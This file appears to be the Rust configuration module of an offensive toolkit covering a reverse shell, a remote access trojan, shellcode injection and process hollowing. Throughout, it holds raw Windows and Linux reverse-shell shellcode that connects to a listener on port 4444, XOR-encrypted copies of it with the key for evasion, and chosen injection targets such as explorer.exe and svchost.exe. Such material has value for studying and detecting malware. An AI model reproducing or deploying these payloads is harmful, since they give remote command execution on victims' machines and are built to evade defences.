/*
    For tcp_reverse_shell OR remote_access_trojan
*/

// IP address of the attacking machine
pub const LISTENER_IP: &str = "127.0.0.1";
// Port the attacking machine is listening on
pub const LISTENER_PORT: u16 = 4444;


/*
    For xor_shellcode OR process_migration without an encryption feature OR process_hollowing without an encryption feature
*/

// Shellcode for Windows targets
pub const WINDOWS_SHELLCODE: &[u8] = &[0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xbe, 0x77, 0x73, 0x32, 0x5f, 0x33, 0x32, 0x00, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x48, 0x81, 0xec, 0xa0, 0x01, 0x00, 0x00, 0x49, 0x89, 0xe5, 0x49, 0xbc, 0x02, 0x00, 0x11, 0x5c, 0x7f, 0x00, 0x00, 0x01, 0x41, 0x54, 0x49, 0x89, 0xe4, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x4c, 0x89, 0xea, 0x68, 0x01, 0x01, 0x00, 0x00, 0x59, 0x41, 0xba, 0x29, 0x80, 0x6b, 0x00, 0xff, 0xd5, 0x50, 0x50, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc0, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc2, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc1, 0x41, 0xba, 0xea, 0x0f, 0xdf, 0xe0, 0xff, 0xd5, 0x48, 0x89, 0xc7, 0x6a, 0x10, 0x41, 0x58, 0x4c, 0x89, 0xe2, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x99, 0xa5, 0x74, 0x61, 0xff, 0xd5, 0x48, 0x81, 0xc4, 0x40, 0x02, 0x00, 0x00, 0x49, 0xb8, 0x63, 0x6d, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x50, 0x41, 0x50, 0x48, 0x89, 0xe2, 0x57, 0x57, 0x57, 0x4d, 0x31, 0xc0, 0x6a, 0x0d, 0x59, 0x41, 0x50, 0xe2, 0xfc, 0x66, 0xc7, 0x44, 0x24, 0x54, 0x01, 0x01, 0x48, 0x8d, 0x44, 0x24, 0x18, 0xc6, 0x00, 0x68, 0x48, 0x89, 0xe6, 0x56, 0x50, 0x41, 0x50, 0x41, 0x50, 0x41, 0x50, 0x49, 0xff, 0xc0, 0x41, 0x50, 0x49, 0xff, 0xc8, 0x4d, 0x89, 0xc1, 0x4c, 0x89, 0xc1, 0x41, 0xba, 0x79, 0xcc, 0x3f, 0x86, 0xff, 0xd5, 0x48, 0x31, 0xd2, 0x48, 0xff, 0xca, 0x8b, 0x0e, 0x41, 0xba, 0x08, 0x87, 0x1d, 0x60, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5];
// Shellcode for Linux targets
pub const LINUX_SHELLCODE: &[u8] = &[0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x48, 0x97, 0x48, 0xb9, 0x02, 0x00, 0x11, 0x5c, 0x7f, 0x00, 0x00, 0x01, 0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a, 0x6a, 0x2a, 0x58, 0x0f, 0x05, 0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce, 0x6a, 0x21, 0x58, 0x0f, 0x05, 0x75, 0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05];
// Key for XOR-encrypting shellcode
pub const XOR_KEY: &[u8] = &[0x01, 0x02, 0x03, 0x04, 0x05];
// Windows process to inject into
pub const WINDOWS_MIGRATION_TARGET: &str = "explorer.exe";
// Linux process to inject into
pub const LINUX_MIGRATION_TARGET: &str = "acpid";
// Windows process to hollow (using a full path is advised)
pub const WINDOWS_HOLLOWING_TARGET: &str = "C:\\Windows\\System32\\svchost.exe";
// Linux process to hollow (using a full path is advised)
pub const LINUX_HOLLOWING_TARGET: &str = "/bin/curl";


/*
    For process_migration with an encryption feature OR process_hollowing with an encryption feature
*/

// XOR-encrypted shellcode for Windows targets
pub const ENCRYPTED_WINDOWS_SHELLCODE: &[u8] = &[0xfd, 0x4a, 0x80, 0xe0, 0xf5, 0xe9, 0xc2, 0x03, 0x04, 0x05, 0x40, 0x53, 0x42, 0x54, 0x57, 0x50, 0x54, 0x4b, 0x35, 0xd7, 0x64, 0x4a, 0x88, 0x56, 0x65, 0x49, 0x89, 0x51, 0x1c, 0x4d, 0x8a, 0x50, 0x23, 0x4c, 0x8e, 0x73, 0x52, 0x4b, 0x0b, 0xb2, 0x4b, 0x48, 0x4e, 0x35, 0xcc, 0x49, 0x33, 0xc3, 0xa8, 0x39, 0x60, 0x7e, 0x01, 0x28, 0x25, 0x40, 0xc3, 0xca, 0x09, 0x44, 0x00, 0xc3, 0xe1, 0xe9, 0x57, 0x40, 0x53, 0x4b, 0x8f, 0x57, 0x21, 0x89, 0x41, 0x38, 0x4d, 0x00, 0xd2, 0x88, 0x84, 0x8d, 0x01, 0x02, 0x03, 0x4c, 0x80, 0xc1, 0x76, 0x64, 0x4c, 0x04, 0xd1, 0x52, 0x88, 0x4c, 0x1d, 0x45, 0x89, 0x43, 0x24, 0x4c, 0x00, 0xd2, 0xe0, 0x52, 0x4d, 0xfe, 0xcb, 0x42, 0x8f, 0x31, 0x89, 0x4a, 0x02, 0xd2, 0x48, 0x30, 0xcb, 0x4b, 0x35, 0xc5, 0xad, 0x43, 0xc2, 0xcd, 0x08, 0x40, 0x03, 0xc2, 0x3c, 0xe5, 0x74, 0xf3, 0x4f, 0x07, 0x49, 0x25, 0x0a, 0x46, 0x3d, 0xd4, 0x74, 0xda, 0x5b, 0x40, 0x8e, 0x41, 0x26, 0x4a, 0x05, 0xd5, 0x67, 0x43, 0x88, 0x08, 0x4d, 0x45, 0x89, 0x43, 0x18, 0x4c, 0x00, 0xd2, 0x42, 0x8f, 0x01, 0x89, 0x4a, 0x02, 0xd4, 0x44, 0x59, 0x43, 0x5b, 0x5a, 0x5c, 0x5b, 0x43, 0x5b, 0x45, 0x5c, 0x40, 0x58, 0x4b, 0x87, 0xe9, 0x21, 0x43, 0x51, 0xfb, 0xe5, 0x59, 0x43, 0x5a, 0x5e, 0x4d, 0x8a, 0x10, 0xea, 0x53, 0xfa, 0xfe, 0xfd, 0x5e, 0x4d, 0xbb, 0x76, 0x71, 0x31, 0x5b, 0x36, 0x33, 0x02, 0x03, 0x45, 0x53, 0x48, 0x8b, 0xe5, 0x4c, 0x84, 0xed, 0xa2, 0x02, 0x04, 0x05, 0x48, 0x8b, 0xe6, 0x4d, 0xb9, 0x03, 0x02, 0x12, 0x58, 0x7a, 0x01, 0x02, 0x02, 0x45, 0x51, 0x48, 0x8b, 0xe7, 0x48, 0x8c, 0xf0, 0x43, 0xb9, 0x48, 0x72, 0x27, 0x05, 0xfc, 0xd1, 0x49, 0x88, 0xe8, 0x6b, 0x05, 0x04, 0x01, 0x02, 0x5a, 0x45, 0xbf, 0x28, 0x82, 0x68, 0x04, 0xfa, 0xd4, 0x52, 0x53, 0x49, 0x34, 0xc8, 0x4f, 0x32, 0xc4, 0x4d, 0xfe, 0xc2, 0x4b, 0x8d, 0xc7, 0x49, 0xfd, 0xc3, 0x4c, 0x8c, 0xc0, 0x43, 0xb9, 0xee, 0x0a, 0xde, 0xe2, 0xfc, 0xd1, 0x4d, 0x88, 0xc5, 0x69, 0x14, 0x44, 0x59, 0x4e, 0x8a, 0xe6, 0x4d, 0x88, 0xfb, 0x42, 0xbe, 0x9c, 0xa4, 0x76, 0x62, 0xfb, 0xd0, 0x49, 0x83, 0xc7, 0x44, 0x07, 0x01, 0x02, 0x4a, 0xbc, 0x66, 0x6c, 0x66, 0x03, 0x04, 0x05, 0x01, 0x02, 0x42, 0x54, 0x44, 0x51, 0x4a, 0x8a, 0xe6, 0x52, 0x56, 0x55, 0x4e, 0x35, 0xc5, 0x6b, 0x0f, 0x5a, 0x45, 0x55, 0xe3, 0xfe, 0x65, 0xc3, 0x41, 0x25, 0x56, 0x02, 0x05, 0x4d, 0x8c, 0x46, 0x27, 0x1c, 0xc3, 0x01, 0x6a, 0x4b, 0x8d, 0xe3, 0x57, 0x52, 0x42, 0x54, 0x44, 0x51, 0x43, 0x53, 0x4d, 0xfa, 0xc1, 0x43, 0x53, 0x4d, 0xfa, 0xc9, 0x4f, 0x8a, 0xc5, 0x49, 0x88, 0xc3, 0x42, 0xbe, 0x7c, 0xcd, 0x3d, 0x85, 0xfb, 0xd0, 0x49, 0x33, 0xd1, 0x4c, 0xfa, 0xcb, 0x89, 0x0d, 0x45, 0xbf, 0x09, 0x85, 0x1e, 0x64, 0xfa, 0xd4, 0xb9, 0xf3, 0xb1, 0xa7, 0x57, 0x43, 0xb9, 0xa2, 0x90, 0xbc, 0x9f, 0xfc, 0xd1, 0x4d, 0x82, 0xc6, 0x2b, 0x38, 0x03, 0x7d, 0x08, 0x83, 0xff, 0xe5, 0x74, 0x07, 0xb8, 0x43, 0x16, 0x73, 0x6d, 0x69, 0x04, 0x5c, 0x40, 0x8b, 0xd9, 0xfb, 0xd0];
// XOR-encrypted shellcode for Linux targets
pub const ENCRYPTED_LINUX_SHELLCODE: &[u8] = &[0x6b, 0x2b, 0x5b, 0x9d, 0x6f, 0x03, 0x5d, 0x69, 0x05, 0x5b, 0x0e, 0x07, 0x4b, 0x93, 0x4d, 0xb8, 0x00, 0x03, 0x15, 0x59, 0x7e, 0x02, 0x03, 0x05, 0x54, 0x49, 0x8b, 0xe5, 0x6e, 0x15, 0x5b, 0x68, 0x29, 0x5c, 0x0a, 0x04, 0x68, 0x00, 0x5a, 0x4d, 0xfe, 0xcc, 0x69, 0x25, 0x5d, 0x0e, 0x07, 0x76, 0xf2, 0x6f, 0x3a, 0x5a, 0x9a, 0x4c, 0xbe, 0x2e, 0x60, 0x6a, 0x6a, 0x2a, 0x72, 0x6a, 0x03, 0x57, 0x4d, 0x88, 0xe5, 0x51, 0x53, 0x4d, 0x88, 0xe4, 0x0c, 0x01];
// Windows process to inject into
pub const ENCRYPTED_WINDOWS_MIGRATION_TARGET: &[u8] = &[0x64, 0x7a, 0x73, 0x68, 0x6a, 0x73, 0x67, 0x71, 0x2a, 0x60, 0x79, 0x67];
// Linux process to inject into
pub const ENCRYPTED_LINUX_MIGRATION_TARGET: &[u8] = &[0x60, 0x61, 0x73, 0x6d, 0x61];
// Windows process to hollow (using a full path is advised)
pub const ENCRYPTED_WINDOWS_HOLLOWING_TARGET: &[u8] = &[0x42, 0x38, 0x5f, 0x53, 0x6c, 0x6f, 0x66, 0x6c, 0x73, 0x76, 0x5d, 0x51, 0x7a, 0x77, 0x71, 0x64, 0x6f, 0x30, 0x36, 0x59, 0x72, 0x74, 0x60, 0x6c, 0x6a, 0x72, 0x76, 0x2d, 0x61, 0x7d, 0x64];
// Linux process to hollow (using a full path is advised)
pub const ENCRYPTED_LINUX_HOLLOWING_TARGET: &[u8] = &[0x2e, 0x60, 0x6a, 0x6a, 0x2a, 0x62, 0x77, 0x71, 0x68];
